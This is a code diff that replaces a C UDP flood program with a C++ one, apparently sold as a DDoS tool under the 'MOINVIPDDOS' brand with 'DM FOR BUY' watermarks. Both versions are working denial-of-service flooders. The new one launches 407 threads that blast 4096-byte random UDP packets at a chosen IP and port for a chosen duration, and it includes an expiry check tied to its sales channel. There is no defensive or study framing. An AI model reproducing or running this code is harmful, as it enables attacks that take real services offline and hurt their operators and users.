@@ -1,83 +1,125 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
+#include <iostream>
+#include <cstring>
+#include <thread>
+#include <vector>
 #include <arpa/inet.h>
-#include <sys/wait.h>
-#include <time.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <ctime>
+#include <random>
+//MADE BY MOINVIPDDOS
+//MADE BY MOINVIPDDOS
+//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE
 
-void usage() {
-    printf("Usage: ./soulfix ip port time processes\n");
-    exit(1);
+#define MAX_THREADS 407
+#define EXPIRY_YEAR 2025
+#define EXPIRY_MONTH 12
+#define EXPIRY_DAY 31
+
+using namespace std;
+
+
+void print_usage(const char *prog_name) {
+    cout << "Usage: " << prog_name << " <target IP> <port> <time duration>" << endl;
+    exit(EXIT_FAILURE);
 }
 
-void randomize_payload(char *payload, int size) {
-    for (int i = 0; i < size; i++) {
-        payload[i] = (rand() % 256);  // Random byte values (0-255)
+
+void check_expiry() {
+    time_t t = time(nullptr);
+    struct tm *current_time = localtime(&t);
+
+    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||
+        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
+        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH && current_time->tm_mday > EXPIRY_DAY)) {
+        cout << "This file has expired. Please contact @Vip_Ddos_07 for updates." << endl;
+        exit(EXIT_FAILURE);
     }
 }
 
-void attack(char *ip, int port, int duration) {
-    int sock;
-    struct sockaddr_in server_addr;
-    time_t endtime = time(NULL) + duration;
 
-    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-        perror("Socket creation failed");
-        exit(1);
+string generate_payload(size_t size) {
+    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!Bgmikimaakichut@#$%^&*()_+-=[]{}|;:'\",.<>?/`~";
+    random_device rd; 
+    mt19937 generator(rd());
+    uniform_int_distribution<> dist(0, sizeof(charset) - 2); 
+    string payload;
+    payload.reserve(size);
+
+    for (size_t i = 0; i < size; ++i) {
+        payload += charset[dist(generator)];
+    }
+    return payload;
+}
+
+
+void flood(const string &target_ip, int port, int duration) {
+    struct sockaddr_in target;
+    string payload = generate_payload(4096); // 
+
+    
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        cerr << "Socket creation failed." << endl;
+        return;
     }
 
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    server_addr.sin_addr.s_addr = inet_addr(ip);
+   
+    target.sin_family = AF_INET;
+    target.sin_port = htons(port);
+    if (inet_pton(AF_INET, target_ip.c_str(), &target.sin_addr) <= 0) {
+        cerr << "Invalid target IP address." << endl;
+        close(sock);
+        return;
+    }
 
-    srand(time(NULL) ^ getpid());  // Unique seed for randomness
+    
+    cout << "Flood started to " << target_ip << " with 1 Thread for time " << duration << " seconds." << endl;
+    cout << "WATERMARK: THIS BOT PROVIDE BY @MOINVIPDDOS\nDM FOR BUY : @Vip_Ddos_07" << endl;
 
-    while (time(NULL) <= endtime) {
-        int payload_size = (rand() % 800) + 200;  // Random size (200-1000 bytes)
-        char payload[payload_size];
-        randomize_payload(payload, payload_size);
-
-        sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-
-        usleep((rand() % 1000) + 500);  // Random delay (500-1500 microseconds)
+    time_t start_time = time(nullptr);
+    while (difftime(time(nullptr), start_time) < duration) {
+        if (sendto(sock, payload.c_str(), payload.size(), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
+            cerr << "Failed to send packet." << endl;
+        }
     }
 
     close(sock);
-    exit(0);
+    cout << "Thread finished sending packets." << endl;
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        usage();
+    
+    check_expiry();
+
+    if (argc != 4) {
+        print_usage(argv[0]);
     }
 
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int processes = atoi(argv[4]);
+    
+    cout << "This file is closed by @Vip_Ddos_07." << endl;
+    cout << "JOIN CHANNEL TO USE THIS FILE.@MOINVIPDDOS" << endl;
 
-    printf("Flood started on %s:%d for %d seconds with %d processes\n", ip, port, duration, processes);
+    
+    string target_ip = argv[1];
+    int port = stoi(argv[2]);
+    int duration = stoi(argv[3]);
 
-    for (int i = 0; i < processes; i++) {
-        pid_t pid = fork();
-        if (pid < 0) {
-            perror("Fork failed");
-            exit(1);
+    cout << "STARTING ATTACKS BY @MOINVIPDDOS ON : " << target_ip << " on port " << port << " for " << duration << " seconds using " << MAX_THREADS << " threads." << endl;
+
+  
+    vector<thread> threads;
+    for (int i = 0; i < MAX_THREADS; ++i) {
+        threads.emplace_back(flood, target_ip, port, duration);
+    }
+
+    
+    for (auto &t : threads) {
+        if (t.joinable()) {
+            t.join();
         }
-        if (pid == 0) {
-            attack(ip, port, duration);
-        }
     }
 
-    for (int i = 0; i < processes; i++) {
-        wait(NULL);
-    }
-
-    printf("Attack finished\n");
+    cout << "WATERMARK ATTACK COMPLETED BY @MOINVIPDDOS" << endl;
     return 0;
 }
